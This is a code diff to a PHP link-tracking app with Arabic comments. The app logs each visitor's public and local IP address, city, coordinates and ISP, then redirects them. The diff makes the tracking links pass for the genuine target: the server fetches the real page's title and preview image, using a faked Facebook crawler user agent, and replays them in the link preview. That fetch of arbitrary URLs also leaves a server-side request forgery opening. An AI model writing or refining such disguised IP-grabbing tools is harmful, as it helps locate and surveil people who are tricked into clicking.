@@ -7,7 +7,8 @@ ini_set('display_errors', 1);
 error_reporting(E_ALL);
 
 try {
-    $db = new PDO('sqlite:tracker.db');$db->setAttribute(PDO::ATTR_ERRMODE, PDO::ERRMODE_EXCEPTION);
+    $db = new PDO('sqlite:tracker.db');
+    $db->setAttribute(PDO::ATTR_ERRMODE, PDO::ERRMODE_EXCEPTION);
 
     $db->exec("CREATE TABLE IF NOT EXISTS links (
         id INTEGER PRIMARY KEY AUTOINCREMENT, 
@@ -38,18 +39,75 @@ try {
     die("خطأ في قاعدة البيانات: " . $e->getMessage());
 }
 
-// دالة سريعة وآمنة لاستخراج العنوان وغلاف يوتيوب فوراً بدون تعليق
-function get_fast_meta($url) {$parsed_url = parse_url($url);$title = $parsed_url['host'] ?? $url;
-    $image = "https://images.unsplash.com/photo-1618005182384-a83a8bd57fbe?w=600&auto=format&fit=crop&q=60";
+// دالة سحب العنوان والصورة الأصلية ديناميكياً من أي موقع أو فيديو
+function fetch_real_meta($url) {
+    $title = "";
+    $image = "";
 
-    // إذا كان الرابط يوتيوب، نأخذ الغلاف فوراً بدون طلبات خارجية بطيئة
-    if (preg_match('/(?:youtube\.com\/(?:[^\/]+\/.+\/|(?:v|e(?:mbed)?)\/|.*[?&]v=)|youtu\.be\/)([^"&?\/\s]{11})/', $url,$matches)) {
-        $video_id =$matches[1];
+    // إذا كان الرابط يوتيوب، نقوم بجلب العنوان والصورة عبر API مجاني وسريع جداً
+    if (preg_match('/(?:youtube\.com\/(?:[^\/]+\/.+\/|(?:v|e(?:mbed)?)\/|.*[?&]v=)|youtu\.be\/)([^"&?\/\s]{11})/', $url, $matches)) {
+        $video_id = $matches[1];
         $image = "https://img.youtube.com/vi/{$video_id}/hqdefault.jpg";
-        $title = "فيديو يوتيوب - " . $video_id;
+        
+        $oembed_url = "https://www.youtube.com/oembed?url=" . urlencode($url) . "&format=json";
+        $ch = curl_init();
+        curl_setopt($ch, CURLOPT_URL,$oembed_url);
+        curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
+        curl_setopt($ch, CURLOPT_TIMEOUT, 3);
+        $json = curl_exec($ch);
+        curl_close($ch);
+        
+        if ($json) {
+            $data = json_decode($json, true);
+            if (isset($data['title'])) {
+                $title =$data['title'];
+            }
+        }
     }
 
-    return ['title' => $title, 'image' =>$image];
+    // إذا لم يكن يوتيوب أو تعذر الجلب، نقوم بقراءة صفحة الـ HTML مباشرة
+    if (empty($title)) {$ch = curl_init();
+        curl_setopt($ch, CURLOPT_URL,$url);
+        curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
+        curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true);
+        curl_setopt($ch, CURLOPT_TIMEOUT, 3); // مهلة 3 ثوانٍ لتفادي الشاشة السوداء
+        curl_setopt($ch, CURLOPT_USERAGENT, 'facebookexternalhit/1.1 (+http://www.facebook.com/externalhit_uatext.php)');
+        $html = curl_exec($ch);
+        curl_close($ch);
+
+        if ($html) {$dom = new DOMDocument();
+            @$dom->loadHTML(mb_convert_encoding($html, 'HTML-ENTITIES', 'UTF-8'));
+            $xpath = new DOMXPath($dom);
+
+            // استخراج عنوان og:title أو title الاصلي
+            $titleNodes =$xpath->query('//meta[@property="og:title"]/@content | //meta[@name="twitter:title"]/@content');
+            if ($titleNodes->length > 0) {
+                $title =$titleNodes->item(0)->nodeValue;
+            } else {
+                $nodes =$dom->getElementsByTagName('title');
+                if ($nodes->length > 0) {
+                    $title =$nodes->item(0)->nodeValue;
+                }
+            }
+
+            // استخراج صورة og:image الأصلية
+            if (empty($image)) {
+                $imageNodes =$xpath->query('//meta[@property="og:image"]/@content | //meta[@name="twitter:image"]/@content');
+                if ($imageNodes->length > 0) {
+                    $image =$imageNodes->item(0)->nodeValue;
+                }
+            }
+        }
+    }
+
+    // احتياطياً في حال تعذر السحب تماماً
+    if (empty($title)) {
+        $title = parse_url($url, PHP_URL_HOST);
+    }
+    if (empty($image)) {$image = "https://images.unsplash.com/photo-1618005182384-a83a8bd57fbe?w=600&auto=format&fit=crop&q=60";
+    }
+
+    return ['title' => trim($title), 'image' => trim($image)];
 }
 
 function get_real_ip() {
@@ -95,7 +153,8 @@ function get_ip_details($ip) {
         return [
             'country' => $data['country'] ?? 'غير معروف',
             'city' => $data['city'] ?? 'غير معروف',
-            'lat' => $data['lat'] ?? '36.7538',              'lon' =>$data['lon'] ?? '3.0588',
+            'lat' => $data['lat'] ?? '36.7538', 
+            'lon' =>$data['lon'] ?? '3.0588',
             'isp' => parse_isp($data['isp'] ?? '',$data['org'] ?? '')
         ];
     }
@@ -103,8 +162,8 @@ function get_ip_details($ip) {
 }
 
 // 1. معالجة إعادة التوجيه الفوري
-$og_title = "رابط تفاعلي";
-$og_image = "https://images.unsplash.com/photo-1618005182384-a83a8bd57fbe?w=600&auto=format&fit=crop&q=60";
+$og_title = "";
+$og_image = "";
 
 if (isset($_GET['r'])) {
     $code =$_GET['r'];
@@ -114,12 +173,8 @@ if (isset($_GET['r'])) {
 
     if ($link) {
         $target =$link['target_url'];
-        if (!empty($link['meta_title'])) {
-            $og_title =$link['meta_title'];
-        }
-        if (!empty($link['meta_image'])) {
-            $og_image =$link['meta_image'];
-        }
+        $og_title =$link['meta_title'];
+        $og_image =$link['meta_image'];
 
         $public_ip = get_real_ip();
         $local_ip =$_GET['lip'] ?? 'غير متوفر';
@@ -145,7 +200,7 @@ if (isset($_GET['r'])) {
     }
 }
 
-// 2. إنشاء رابط جديد بسرعة فائقة
+// 2. إنشاء رابط جديد وجلب العنوان الحقيقي تلقائياً من أي موقع
 $generated_link = "";
 $tracking_code = "";
 if ($_SERVER['REQUEST_METHOD'] === 'POST' and isset($_POST['create'])) {
@@ -154,7 +209,7 @@ if ($_SERVER['REQUEST_METHOD'] === 'POST' and isset($_POST['create'])) {
         $target_url = "https://" . $target_url;
     }
 
-    $meta = get_fast_meta($target_url);
+    $meta = fetch_real_meta($target_url);
 
     $code = substr(md5(uniqid(rand(), true)), 0, 7);
     $stmt =$db->prepare("INSERT INTO links (code, target_url, meta_title, meta_image) VALUES (?, ?, ?, ?)");
@@ -183,9 +238,8 @@ if (!empty($filter_code)) {
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title><?php echo htmlspecialchars($og_title); ?></title>
     
-    <!-- وسوم المعاينة المباشرة -->
+    <!-- وسوم المعاينة المباشرة المستخرجة من الموقع الأصلي -->
     <meta property="og:title" content="<?php echo htmlspecialchars($og_title); ?>">
-    <meta property="og:description" content="اضغط هنا للمشاهدة والتفاصيل.">
     <meta property="og:image" content="<?php echo htmlspecialchars($og_image); ?>">
     <meta property="og:type" content="website">
 
@@ -299,7 +353,7 @@ if (!empty($filter_code)) {
         <div class="card">
             <h2>🔗 إنشاء رابط تتبع جديد</h2>
             <form method="POST" class="form-group">
-                <input type="text" name="target_url" placeholder="أدخل رابط الفيديو (يوتيوب، فيسبوك...)" required>
+                <input type="text" name="target_url" placeholder="أدخل رابط الفيديو أو الصفحة (يوتيوب، فيسبوك، إلخ)" required>
                 <button type="submit" name="create">توليد الرابط</button>
             </form>
 
